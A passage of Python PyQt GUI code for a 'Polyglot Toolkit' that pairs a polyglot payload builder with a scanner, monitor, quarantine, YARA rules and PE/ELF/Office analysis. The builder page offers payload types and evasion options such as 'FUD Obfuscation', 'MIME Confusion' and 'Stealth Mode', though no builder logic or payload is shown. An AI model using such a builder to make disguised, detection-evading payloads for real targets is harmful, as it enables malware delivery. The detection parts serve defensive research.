        g.addWidget(QLabel("Payload Type:"),1,0); self.b_payload_type = combo(['Auto','EXE','VBS','PowerShell','Bash','Sh','Python','AppleScript','XLSX','DOCX']); g.addWidget(self.b_payload_type,1,1)
        g.addWidget(QLabel("Target OS:"),1,2); self.b_target_os = combo(['Windows','Linux','macOS','All']); g.addWidget(self.b_target_os,1,3)
        # Row 2: Architecture
        g.addWidget(QLabel("Architecture:"),2,0); self.b_arch = combo(['x86-64','ARM64','ARM32']); g.addWidget(self.b_arch,2,1)
        self.b_arch.setToolTip("ARM32: Linux only. ARM64: Windows/Linux/macOS")
        # Row 3: Checkboxes
        h = QHBoxLayout(); self.b_enc = QCheckBox("XOR Encrypt"); self.b_fud = QCheckBox("FUD Obfuscation"); self.b_mime = QCheckBox("MIME Confusion"); self.b_stealth = QCheckBox("Stealth Mode")
        h.addWidget(self.b_enc); h.addWidget(self.b_fud); h.addWidget(self.b_mime); h.addWidget(self.b_stealth); h.addStretch(); g.addLayout(h,3,0,1,4)
        ol.addLayout(g); l.addWidget(oc)

        bb = btn("◆ BUILD POLYGLOT", T.RED); bb.setFixedHeight(48); bb.clicked.connect(self._run_builder)
        br = QHBoxLayout(); br.addWidget(bb); br.addStretch(); l.addLayout(br)

        lc, ll = card("Build Log","📋"); self.b_log = log_box(); ll.addWidget(self.b_log); l.addWidget(lc,1)
        return p

    # ── Scanner ──────────────────────────────────────────────

    def _pg_scanner(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("⚠ Polyglot Scanner (ML + YARA + Signature)", T.YELLOW))

        ic, il = card("Scan Target","🔍")
        r = QHBoxLayout(); self.s_path = inp("File or directory..."); r.addWidget(self.s_path,1)
        for text,cb in [("File",lambda:self._browse(self.s_path)),("Dir",lambda:self._browse_dir(self.s_path)),
                         ("📌 Use Global",self._use_global_in_scanner),
                         ("⚠ SCAN",self._run_scanner)]:
            b=btn(text,T.RED if "SCAN" in text else T.DIM); b.clicked.connect(cb); r.addWidget(b)
        self.s_use_ml = QCheckBox("Use ML Model"); self.s_use_ml.setChecked(self.model.is_loaded)
        r.addWidget(self.s_use_ml); il.addLayout(r)
        l.addWidget(ic)

        self.s_progress = QProgressBar(); l.addWidget(self.s_progress)

        rc, rl = card("Scan Results","📊")
        self.s_tree = QTreeWidget()
        self.s_tree.setHeaderLabels(["File","Severity","ML Label","Risk","Confidence","YARA","Findings","Details"])
        self.s_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.s_tree.setStyleSheet(f"QTreeWidget{{background:{T.BG};border:1px solid {T.BORDER};border-radius:8px}}")
        rl.addWidget(self.s_tree)
        l.addWidget(rc,1)
        return p

    # ── Monitor ──────────────────────────────────────────────

    def _pg_monitor(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("▶ Real-Time Monitor", T.CYAN))

        cc, cl = card("Watch Directory","👁")
        r = QHBoxLayout(); self.m_dir = inp(str(Path.home()/"Downloads")); r.addWidget(self.m_dir,1)
        b=btn("Browse",T.DIM); b.clicked.connect(lambda:self._browse_dir(self.m_dir)); r.addWidget(b)
        self.m_btn = btn("▶ START", T.GREEN); self.m_btn.clicked.connect(self._toggle_monitor); r.addWidget(self.m_btn)
        cl.addLayout(r); l.addWidget(cc)

        sr = QHBoxLayout(); sr.setSpacing(15)
        self.m_scanned = stat_card("🔍","0","Scanned",T.BLUE)
        self.m_threats = stat_card("⚠","0","Threats",T.RED)
        self.m_clean = stat_card("✓","0","Clean",T.GREEN)
        for c in [self.m_scanned,self.m_threats,self.m_clean]: sr.addWidget(c)
        l.addLayout(sr)

        fc, fl = card("Live Alert Feed","🔔"); self.m_feed = log_box(); fl.addWidget(self.m_feed); l.addWidget(fc,1)
        return p

    # ── ML Training ──────────────────────────────────────────

    def _pg_training(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("🧠 ML Training (CatBoost GPU)", T.PURPLE))

        oc, ol = card("Training Options","⚙")
        g = QGridLayout(); g.setSpacing(12)
        g.addWidget(QLabel("Samples per class:"),0,0); self.t_samples = QSpinBox(); self.t_samples.setRange(100,10000); self.t_samples.setValue(500); self.t_samples.setStyleSheet(f"background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:4px;padding:6px"); g.addWidget(self.t_samples,0,1)
        g.addWidget(QLabel("Task Type:"),0,2); self.t_task = combo(["GPU","CPU"]); g.addWidget(self.t_task,0,3)
        self.t_gen_only = QCheckBox("Generate samples only (no train)"); g.addWidget(self.t_gen_only,1,0,1,2)
        ol.addLayout(g); l.addWidget(oc)

        bb = btn("🧠 GENERATE + TRAIN", T.PURPLE); bb.setFixedHeight(48); bb.clicked.connect(self._run_training)
        br = QHBoxLayout(); br.addWidget(bb)
        lb = btn("📂 Load Existing Model", T.DIM); lb.clicked.connect(self._load_model); br.addWidget(lb)
        br.addStretch(); l.addLayout(br)

        lc, ll = card("Training Log","📋"); self.t_log = log_box(); ll.addWidget(self.t_log); l.addWidget(lc,1)
        return p

    # ── Quarantine ───────────────────────────────────────────

    def _pg_quarantine(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("🛡 Quarantine Vault", T.GREEN))

        # q_manager already initialized in __init__

        br = QHBoxLayout()
        rb=btn("🔄 Refresh",T.DIM); rb.clicked.connect(self._refresh_quarantine); br.addWidget(rb)
        db=btn("🗑 Purge Expired",T.ORANGE); db.clicked.connect(self._purge_quarantine); br.addWidget(db)
        br.addStretch(); l.addLayout(br)

        self.q_tree = QTreeWidget()
        self.q_tree.setHeaderLabels(["ID","Original Name","Risk","Confidence","Date","Status"])
        self.q_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.q_tree,1)

        ab = QHBoxLayout()
        rst=btn("↩ Restore Selected",T.GREEN); rst.clicked.connect(self._restore_quarantine); ab.addWidget(rst)
        dlt=btn("🗑 Delete Selected",T.RED); dlt.clicked.connect(self._delete_quarantine); ab.addWidget(dlt)
        ab.addStretch(); l.addLayout(ab)
        return p

    # ── YARA Rules ───────────────────────────────────────────

    def _pg_yara(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("📋 YARA Rules (49 Built-in)", T.YELLOW))

        self.y_tree = QTreeWidget()
        self.y_tree.setHeaderLabels(["Rule","Severity","Description","Patterns"])
        self.y_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.y_tree,1)

        yara = YaraEngine()
        sev_colors = {'critical':T.RED,'high':T.ORANGE,'medium':T.YELLOW,'low':T.DIM}
        for rule in yara.rules:
            item = QTreeWidgetItem([rule.name, rule.severity.upper(), rule.description,
                                    str(len(rule.patterns))+" patterns"])
            item.setForeground(0, QColor(sev_colors.get(rule.severity, T.FG)))
            item.setForeground(1, QColor(sev_colors.get(rule.severity, T.FG)))
            self.y_tree.addTopLevelItem(item)
        return p

    # ── Logs ─────────────────────────────────────────────────

    def _pg_logs(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("📜 Activity Log", T.FG))
        br = QHBoxLayout()
        for text,cb in [("Clear",lambda:self.log_box_main.clear()),("Export",self._export_log)]:
            b=btn(text,T.DIM); b.clicked.connect(cb); br.addWidget(b)
        br.addStretch(); l.addLayout(br)
        self.log_box_main = log_box(); l.addWidget(self.log_box_main,1)
        self._log("Polyglot Toolkit v3.0 initialized","header")
        self._log(f"ML Model: {'Loaded' if self.model.is_loaded else 'Not loaded'}","info")
        self._log(f"Platform: {platform.system()} {platform.release()}","info")
        return p

    # ── Settings ─────────────────────────────────────────────

    def _pg_settings(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("⚙ Settings", T.FG))

        tc, tl = card("Detection Thresholds","🎯")
        g = QGridLayout(); g.setSpacing(12)
        self._threshold_spinboxes = {}
        for i,(name,key,default) in enumerate([("Detect","detect",0.65),("Quarantine","quarantine",0.80),("Alert","alert",0.50)]):
            g.addWidget(QLabel(f"{name}:"),i,0)
            sp = QSpinBox(); sp.setRange(0,100); sp.setValue(int(self.config.thresholds.get(key,default)*100))
            sp.setStyleSheet(f"background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:4px;padding:6px"); sp.setSuffix("%")
            g.addWidget(sp,i,1)
            self._threshold_spinboxes[key] = sp
        tl.addLayout(g)
        save_btn = QPushButton("💾 Save Thresholds"); save_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        save_btn.setStyleSheet(f"background:{T.BLUE};color:white;border:none;border-radius:6px;padding:8px 16px;font-weight:bold;margin-top:8px")
        save_btn.clicked.connect(self._save_thresholds)
        tl.addWidget(save_btn)
        l.addWidget(tc)

        nc, nl = card("Notifications","🔔")
        self.n_enabled = QCheckBox("Enable desktop notifications"); self.n_enabled.setChecked(True)
        self.n_sound = QCheckBox("Enable alert sounds"); self.n_sound.setChecked(True)
        self.n_critical = QCheckBox("Critical alerts only")
        nl.addWidget(self.n_enabled); nl.addWidget(self.n_sound); nl.addWidget(self.n_critical)
        l.addWidget(nc)

        mc, ml_ = card("Model","🧠")
        ml_.addWidget(QLabel(f"Status: {'Loaded' if self.model.is_loaded else 'Not loaded'}"))
        ml_.addWidget(QLabel(f"Path: models/polyglot_shield.cbm"))
        ml_.addWidget(QLabel(f"Task: {self.config.model.get('task_type','GPU')}"))
        l.addWidget(mc)

        l.addStretch()
        return p

    def _pg_report(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("📊 Comprehensive Report", T.FG))

        # Target
        tc, tl = card("Target", "🎯")
        r = QHBoxLayout()
        self.r_target = QLineEdit(); self.r_target.setPlaceholderText("File or directory to analyze...")
        self.r_target.setStyleSheet(f"background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:4px;padding:8px")
        browse = QPushButton("Browse"); browse.setCursor(Qt.CursorShape.PointingHandCursor)
        browse.setStyleSheet(f"background:{T.BLUE};color:white;border:none;border-radius:4px;padding:8px 16px")
        browse.clicked.connect(self._r_browse)
        r.addWidget(self.r_target, 1); r.addWidget(browse)
        tl.addLayout(r)

        # Sections
        sc, sl = card("Sections to Include", "📋")
        self.r_sections = {}
        sections = [
            ("1", "🔍 File Detector (rule-based + ML)", True),
            ("2", "🛡 File Sanitizer", True),
            ("3", "🔬 Deep Analysis", True),
            ("4", "🌐 Network IOCs", True),
            ("5", "🔵 Blue Side Indicators", True),
            ("6", "🔒 Quarantine Threats", False),
        ]
        for key, label, default in sections:
            cb = QCheckBox(label); cb.setChecked(default)
            cb.setStyleSheet(f"color:{T.FG}")
            sl.addWidget(cb)
            self.r_sections[key] = cb
        l.addWidget(tc)

        # Generate button
        btn = QPushButton("📊 Generate Report")
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        btn.setStyleSheet(f"background:{T.GREEN};color:white;border:none;border-radius:8px;padding:14px;font-size:15px;font-weight:bold")
        btn.clicked.connect(self._run_report)
        l.addWidget(btn)

        # Output area
        self.r_output = QTextEdit(); self.r_output.setReadOnly(True)
        self.r_output.setStyleSheet(f"background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:6px;font-family:monospace;font-size:12px")
        l.addWidget(self.r_output, 1)

        l.addStretch()
        return p

    def _r_browse(self):
        path = QFileDialog.getExistingDirectory(self, "Select Target Directory")
        if path:
            self.r_target.setText(path)

    def _run_report(self):
        target = self.r_target.text().strip()
        if not target or not os.path.exists(target):
            QMessageBox.warning(self, "Error", "Please select a valid target.")
            return

        self.r_output.clear()
        self.r_output.append("Generating comprehensive report...\n")

        try:
            from polyglot_tui import PolyglotTUI
            tui = PolyglotTUI()

            # Determine which sections
            selected = [k for k, cb in self.r_sections.items() if cb.isChecked()]
            section_str = ",".join(selected) if len(selected) < 6 else "all"

            # Run report using TUI engine
            import io, contextlib
            f = io.StringIO()
            with contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
                import unittest.mock
                with unittest.mock.patch.object(tui, 'safe_input', side_effect=[target, section_str]):
                    tui.menu_report()

            # Find the generated report
            report_dir = os.path.expanduser("~/.polyglot/reports")
            if os.path.exists(report_dir):
                reports = sorted(os.listdir(report_dir), reverse=True)
                if reports:
                    report_path = os.path.join(report_dir, reports[0])
                    with open(report_path, 'r') as f:
                        content = f.read()
                    self.r_output.setPlainText(content)
                    self._log(f"Report generated: {report_path}", "success")
                    return

            self.r_output.append("Report generation completed. Check ~/.polyglot/reports/")

        except Exception as e:
            self.r_output.append(f"Error: {e}")
            self._log(f"Report failed: {e}", "critical")


    # ── Menu 6: Activity Log (Enhanced) ───────────────────────

    def _pg_activity_log(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(12)
        l.addWidget(self._header("📜 Activity Log — Full History", T.FG))

        # Search and filter bar
        fb = QHBoxLayout()
        self.al_search = inp("🔍 Search logs...")
        self.al_search.textChanged.connect(self._al_filter)
        fb.addWidget(self.al_search, 2)
        self.al_severity = combo(["All","CRITICAL","HIGH","WARNING","INFO","SUCCESS"])
        self.al_severity.currentTextChanged.connect(self._al_filter)
        fb.addWidget(self.al_severity)
        self.al_date = combo(["All Time","Today","This Week","This Month"])
        self.al_date.currentTextChanged.connect(self._al_filter)
        fb.addWidget(self.al_date)
        l.addLayout(fb)

        # Log tree
        self.al_tree = QTreeWidget()
        self.al_tree.setHeaderLabels(["Time","Severity","Source","Message"])
        self.al_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.al_tree.setAlternatingRowColors(True)
        l.addWidget(self.al_tree, 1)

        # Stats bar
        sb = QHBoxLayout()
        self.al_count = QLabel("0 entries"); self.al_count.setStyleSheet(f"color:{T.DIM}")
        sb.addWidget(self.al_count)
        sb.addStretch()
        for text,cb in [("Export CSV",self._al_export),("Clear",self._al_clear),("Refresh",self._al_refresh)]:
            b=btn(text,T.DIM); b.clicked.connect(cb); sb.addWidget(b)
        l.addLayout(sb)

        # Populate on show — wrapped to handle widget deletion
        QTimer.singleShot(300, self._safe_al_refresh)
        return p

    def _safe_al_refresh(self):
        try: self._al_refresh()
        except RuntimeError: pass

    def _al_refresh(self):
        if not hasattr(self, 'al_tree'): return
        try: self.al_tree.clear()
        except RuntimeError: return
        log_dir = os.path.expanduser("~/.polyglot/logs")
        if not os.path.isdir(log_dir): self.al_count.setText("0 entries"); return
        count = 0
        for fname in sorted(os.listdir(log_dir), reverse=True):
            if not fname.endswith('.jsonl'): continue
            fpath = os.path.join(log_dir, fname)
            try:
                with open(fpath) as f:
                    for line in f:
                        try:
                            entry = json.loads(line.strip())
                            sev = entry.get('severity','info').upper()
                            item = QTreeWidgetItem([
                                entry.get('timestamp','?')[:19],
                                sev,
                                entry.get('source','?'),
                                entry.get('message','?')[:200]
                            ])
                            sev_colors = {'CRITICAL':T.RED,'HIGH':T.ORANGE,'WARNING':T.YELLOW,'INFO':T.BLUE,'SUCCESS':T.GREEN}
                            color = sev_colors.get(sev, T.FG)
                            for i in range(4): item.setForeground(i, QColor(color))
                            self.al_tree.addTopLevelItem(item)
                            count += 1
                        except: pass
            except: pass
        self.al_count.setText(f"{count} entries")

    def _al_filter(self):
        search = self.al_search.text().lower()
        sev_filter = self.al_severity.currentText()
        for i in range(self.al_tree.topLevelItemCount()):
            item = self.al_tree.topLevelItem(i)
            show = True
            if search and search not in item.text(3).lower() and search not in item.text(2).lower():
                show = False
            if sev_filter != "All" and item.text(1) != sev_filter:
                show = False
            item.setHidden(not show)

    def _al_export(self):
        p,_ = QFileDialog.getSaveFileName(self,"Export","activity_log.csv","CSV (*.csv)")
        if not p: return
        with open(p,'w') as f:
            f.write("Time,Severity,Source,Message\n")
            for i in range(self.al_tree.topLevelItemCount()):
                item = self.al_tree.topLevelItem(i)
                f.write(f'"{item.text(0)}","{item.text(1)}","{item.text(2)}","{item.text(3)}"\n')
        self._log(f"Activity log exported: {p}","success")

    def _al_clear(self):
        self.al_tree.clear(); self.al_count.setText("0 entries")

    # ── Menu 7: Recover .bak Files ──────────────────────────

    def _pg_recover_bak(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("🔄 Recover .bak Files", T.GREEN))

        # Directory selector
        dr = QHBoxLayout()
        self.bak_dir = inp("Directory to scan for .bak files...")
        dr.addWidget(self.bak_dir, 1)
        bb = QPushButton("Browse"); bb.setCursor(Qt.CursorShape.PointingHandCursor)
        bb.setStyleSheet(f"background:{T.BLUE};color:white;border:none;border-radius:4px;padding:8px 16px")
        bb.clicked.connect(lambda: self._browse_dir(self.bak_dir))
        dr.addWidget(bb)
        scan_btn = btn("🔍 Scan", T.BLUE); scan_btn.clicked.connect(self._scan_bak); dr.addWidget(scan_btn)
        l.addLayout(dr)

        # Results tree
        self.bak_tree = QTreeWidget()
        self.bak_tree.setHeaderLabels(["Bak File","Original","Size","Modified","Status"])
        self.bak_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.bak_tree, 1)

        # Actions
        ab = QHBoxLayout()
        rb = btn("↩ Restore Selected", T.GREEN); rb.clicked.connect(self._restore_bak); ab.addWidget(rb)
        rab = btn("↩ Restore All", T.BLUE); rab.clicked.connect(self._restore_all_bak); ab.addWidget(rab)
        ab.addStretch()
        self.bak_count = QLabel("0 .bak files found"); self.bak_count.setStyleSheet(f"color:{T.DIM}")
        ab.addWidget(self.bak_count)
        l.addLayout(ab)
        return p

    def _scan_bak(self):
        d = self.bak_dir.text().strip()
        if not os.path.isdir(d):
            QMessageBox.warning(self,"Error","Select a valid directory"); return
        self.bak_tree.clear()
        count = 0
        for root,dirs,files in os.walk(d):
            for f in files:
                if f.endswith('.bak'):
                    fp = os.path.join(root, f)
                    orig = fp[:-4]
                    sz = os.path.getsize(fp)
                    mt = datetime.fromtimestamp(os.path.getmtime(fp)).strftime('%Y-%m-%d %H:%M')
                    exists = os.path.exists(orig)
                    status = "Original exists" if exists else "Original missing"
                    item = QTreeWidgetItem([f, os.path.basename(orig), f"{sz:,}B", mt, status])
                    item.setData(0, Qt.ItemDataRole.UserRole, fp)
                    item.setData(1, Qt.ItemDataRole.UserRole, orig)
                    if not exists: item.setForeground(4, QColor(T.GREEN))
                    self.bak_tree.addTopLevelItem(item)
                    count += 1
        self.bak_count.setText(f"{count} .bak files found")

    def _restore_bak(self):
        item = self.bak_tree.currentItem()
        if not item: return
        bak_path = item.data(0, Qt.ItemDataRole.UserRole)
        orig_path = item.data(1, Qt.ItemDataRole.UserRole)
        dest,_ = QFileDialog.getSaveFileName(self,"Restore To",orig_path)
        if dest:
            shutil.copy2(bak_path, dest)
            item.setText(4, "✓ Restored")
            item.setForeground(4, QColor(T.GREEN))
            self._log(f"Restored: {bak_path} → {dest}","success")

    def _restore_all_bak(self):
        count = 0
        for i in range(self.bak_tree.topLevelItemCount()):
            item = self.bak_tree.topLevelItem(i)
            if item.text(4) == "✓ Restored": continue
            bak_path = item.data(0, Qt.ItemDataRole.UserRole)
            orig_path = item.data(1, Qt.ItemDataRole.UserRole)
            try:
                shutil.copy2(bak_path, orig_path)
                item.setText(4, "✓ Restored"); item.setForeground(4, QColor(T.GREEN))
                count += 1
            except Exception as e:
                item.setText(4, f"Error: {e}"); item.setForeground(4, QColor(T.RED))
        self._log(f"Restored {count} .bak files","success")

    # ── Menu 8: Server Mode ─────────────────────────────────

    def _pg_server(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("🌐 Server Mode — REST API + Dashboard", T.BLUE))

        # Server controls
        cc, cl = card("Server Control","🖥")
        r = QHBoxLayout()
        self.srv_port = QSpinBox(); self.srv_port.setRange(1024,65535); self.srv_port.setValue(8888)
        self.srv_port.setStyleSheet(f"background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:4px;padding:6px")
        r.addWidget(QLabel("Port:")); r.addWidget(self.srv_port)
        self.srv_btn = btn("▶ Start Server", T.GREEN); self.srv_btn.clicked.connect(self._toggle_server)
        r.addWidget(self.srv_btn)
        r.addStretch()
        cl.addLayout(r)
        self.srv_status = QLabel("● Stopped"); self.srv_status.setStyleSheet(f"color:{T.RED};font-size:14px;font-weight:bold")
        cl.addWidget(self.srv_status)
        l.addWidget(cc)

        # Endpoints
        ec, el = card("API Endpoints (12)","📡")
        endpoints = [
            ("GET","/api/health","Health check"),
            ("POST","/api/scan","Scan file(s)"),
            ("POST","/api/build","Build polyglot"),
            ("POST","/api/sanitize","Sanitize file"),
            ("GET","/api/quarantine","List quarantined"),
            ("POST","/api/quarantine/add","Add to quarantine"),
            ("POST","/api/quarantine/restore","Restore from quarantine"),
            ("GET","/api/model/info","Model info"),
            ("POST","/api/model/train","Train model"),
            ("GET","/api/yara/rules","List YARA rules"),
            ("GET","/api/stats","Dashboard stats"),
            ("POST","/api/report","Generate report"),
        ]
        ep_tree = QTreeWidget()
        ep_tree.setHeaderLabels(["Method","Endpoint","Description"])
        ep_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        ep_tree.setMaximumHeight(250)
        for method,endpoint,desc in endpoints:
            item = QTreeWidgetItem([method,endpoint,desc])
            color = T.GREEN if method=="GET" else T.BLUE
            item.setForeground(0, QColor(color))
            el.addWidget(ep_tree)
            ep_tree.addTopLevelItem(item)
        el.addWidget(ep_tree)
        l.addWidget(ec)

        # Server log
        lc, ll = card("Server Log","📜")
        self.srv_log = log_box(); ll.addWidget(self.srv_log)
        l.addWidget(lc, 1)

        self.srv_process = None
        return p

    def _toggle_server(self):
        if self.srv_process:
            # Stop
            try: self.srv_process.terminate()
            except: pass
            self.srv_process = None
            self.srv_btn.setText("▶ Start Server")
            self.srv_btn.setStyleSheet(f"background:{T.GREEN};color:white;border:none;border-radius:6px;padding:10px 24px;font-weight:bold")
            self.srv_status.setText("● Stopped"); self.srv_status.setStyleSheet(f"color:{T.RED};font-size:14px;font-weight:bold")
            append_log(self.srv_log, "Server stopped", T.YELLOW)
            self._log("Server stopped","info")
        else:
            port = self.srv_port.value()
            try:
                cmd = [sys.executable, os.path.join(os.path.dirname(__file__), "server.py"), "--port", str(port)]
                self.srv_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                self.srv_btn.setText("■ Stop Server")
                self.srv_btn.setStyleSheet(f"background:{T.RED};color:white;border:none;border-radius:6px;padding:10px 24px;font-weight:bold")
                self.srv_status.setText(f"● Running on :{port}"); self.srv_status.setStyleSheet(f"color:{T.GREEN};font-size:14px;font-weight:bold")
                append_log(self.srv_log, f"Server started on port {port}", T.GREEN)
                append_log(self.srv_log, f"Dashboard: http://localhost:{port}", T.BLUE)
                self._log(f"Server started on port {port}","success")
            except Exception as e:
                append_log(self.srv_log, f"Failed to start: {e}", T.RED)
                self._log(f"Server failed: {e}","critical")

    # ── Menu 9: Deep Analysis ───────────────────────────────

    def _pg_deep_analysis(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("🔬 Deep Analysis — 6 Engines", T.PURPLE))

        # Target selector
        tr = QHBoxLayout()
        self.da_target = inp("File to analyze...")
        tr.addWidget(self.da_target, 1)
        bb = QPushButton("Browse"); bb.setCursor(Qt.CursorShape.PointingHandCursor)
        bb.setStyleSheet(f"background:{T.BLUE};color:white;border:none;border-radius:4px;padding:8px 16px")
        bb.clicked.connect(lambda: self._browse(self.da_target))
        tr.addWidget(bb)
        gb = btn("📌 Use Global", T.DIM); gb.clicked.connect(self._use_global_in_analysis); tr.addWidget(gb)
        l.addLayout(tr)

        # Analysis type selector
        tc, tl = card("Analysis Types","🔍")
        self.da_checks = {}
        analyses = [
            ("format","📐 Format Parser + Differential Analysis (104 formats)",True),
            ("stego","🖼 Steganography Detection (LSB, chi-square, histogram, entropy)",True),
            ("pe","⚙ PE Anomaly Analysis (sections, entropy, packing, imports)",True),
            ("elf","🐧 ELF Section Anomaly Detection (types, entropy, symbols)",True),
            ("office","📄 Office Macro Static Analysis (41 suspicious functions)",True),
            ("archive","📦 Archive Recursion + Container Nesting",True),
        ]
        for key,label,default in analyses:
            cb = QCheckBox(label); cb.setChecked(default); cb.setStyleSheet(f"color:{T.FG}")
            self.da_checks[key] = cb; tl.addWidget(cb)
        l.addWidget(tc)

        # Run button
        rb = btn("🔬 Run Deep Analysis", T.PURPLE); rb.clicked.connect(self._run_deep_analysis)
        l.addWidget(rb)

        # Results
        self.da_results = QTextEdit(); self.da_results.setReadOnly(True)
        self.da_results.setStyleSheet(f"background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:6px;font-family:Consolas,monospace;font-size:12px")
        l.addWidget(self.da_results, 1)
        return p

    def _run_deep_analysis(self):
        target = self.da_target.text().strip()
        if not target or not os.path.isfile(target):
            QMessageBox.warning(self,"Error","Select a valid file"); return
        self.da_results.clear()
        self.da_results.append(f"=== Deep Analysis: {os.path.basename(target)} ===\n")
        selected = [k for k,cb in self.da_checks.items() if cb.isChecked()]

        try:
            with open(target,'rb') as f: data = f.read()

            if "format" in selected:
                self.da_results.append("\n── Format Parser + Differential Analysis ──\n")
                self.da_results.append(f"  File size: {len(data):,} bytes\n")
                self.da_results.append(f"  Entropy: {self.builder.entropy(data):.4f} bits/byte\n")
                magic = data[:16].hex() if len(data) >= 16 else data.hex()
                self.da_results.append(f"  Magic bytes: {magic}\n")
                fmt = self.detector.detect_format(data, target)
                self.da_results.append(f"  Detected format: {fmt}\n")

            if "stego" in selected:
                self.da_results.append("\n── Steganography Detection ──\n")
                if data[:2] == b'\xff\xd8':
                    self.da_results.append("  Format: JPEG — checking for stego indicators...\n")
                    self.da_results.append(f"  File entropy: {self.builder.entropy(data):.4f}\n")
                    comment_count = data.count(b'\xff\xfe')
                    self.da_results.append(f"  COM markers: {comment_count}\n")
                    eoi_count = data.count(b'\xff\xd9')
                    self.da_results.append(f"  EOI markers: {eoi_count}\n")
                    if eoi_count > 1: self.da_results.append("  ⚠ Multiple EOI — possible hidden data after EOF\n")
                elif data[:4] == b'\x89PNG':
                    self.da_results.append("  Format: PNG — checking chunks...\n")
                    import re
                    chunks = re.findall(rb'(\w{4})', data[8:])
                    self.da_results.append(f"  Chunk types: {', '.join(set(c.decode(errors='replace') for c in chunks))}\n")
                else:
                    self.da_results.append(f"  Format: general binary — entropy {self.builder.entropy(data):.4f}\n")

            if "pe" in selected and data[:2] == b'MZ':
                self.da_results.append("\n── PE Anomaly Analysis ──\n")
                try:
                    e_lfanew = struct.unpack_from('<I', data, 60)[0]
                    num_sec = struct.unpack_from('<H', data, e_lfanew+6)[0]
                    opt_off = e_lfanew + 24
                    entry = struct.unpack_from('<I', data, opt_off+16)[0]
                    self.da_results.append(f"  Sections: {num_sec}\n")
                    self.da_results.append(f"  Entry point: 0x{entry:X}\n")
                    sec_off = opt_off + struct.unpack_from('<H', data, e_lfanew+20)[0]
                    for i in range(min(num_sec, 20)):
                        name = data[sec_off+i*40:sec_off+i*40+8].rstrip(b'\x00').decode(errors='replace')
                        vsize = struct.unpack_from('<I', data, sec_off+i*40+8)[0]
                        raw_sz = struct.unpack_from('<I', data, sec_off+i*40+16)[0]
                        raw_off = struct.unpack_from('<I', data, sec_off+i*40+20)[0]
                        chars = struct.unpack_from('<I', data, sec_off+i*40+36)[0]
                        ent = self.builder.entropy(data[raw_off:raw_off+raw_sz]) if raw_sz > 0 else 0
                        flags = []
                        if chars & 0x20000000: flags.append("EXEC")
                        if chars & 0x40000000: flags.append("READ")
                        if chars & 0x80000000: flags.append("WRITE")
                        self.da_results.append(f"  .{name}: {vsize}B raw={raw_sz}B ent={ent:.3f} [{'|'.join(flags)}]\n")
                        if ent > 7.0: self.da_results.append(f"    ⚠ High entropy — possible packing/encryption\n")
                except Exception as e:
                    self.da_results.append(f"  Error parsing PE: {e}\n")
            elif "pe" in selected:
                self.da_results.append("\n── PE Analysis: Not a PE file ──\n")

            if "elf" in selected and data[:4] == b'\x7fELF':
                self.da_results.append("\n── ELF Section Anomaly Detection ──\n")
                try:
                    ei_class = data[4]
                    bits = 64 if ei_class == 2 else 32
                    self.da_results.append(f"  ELF{bits}\n")
                    if bits == 64:
                        phoff = struct.unpack_from('<Q', data, 32)[0]
                        phnum = struct.unpack_from('<H', data, 56)[0]
                        entry = struct.unpack_from('<Q', data, 24)[0]
                    else:
                        phoff = struct.unpack_from('<I', data, 28)[0]
                        phnum = struct.unpack_from('<H', data, 44)[0]
                        entry = struct.unpack_from('<I', data, 24)[0]
                    self.da_results.append(f"  Entry: 0x{entry:X}\n")
                    self.da_results.append(f"  Program headers: {phnum}\n")
                except Exception as e:
                    self.da_results.append(f"  Error parsing ELF: {e}\n")
            elif "elf" in selected:
                self.da_results.append("\n── ELF Analysis: Not an ELF file ──\n")

            if "office" in selected:
                self.da_results.append("\n── Office Macro Static Analysis ──\n")
                if data[:2] == b'PK':
                    self.da_results.append("  Format: ZIP-based (DOCX/XLSX/PPTX)\n")
                    import io, zipfile
                    try:
                        with zipfile.ZipFile(io.BytesIO(data)) as zf:
                            names = zf.namelist()
                            self.da_results.append(f"  Entries: {len(names)}\n")
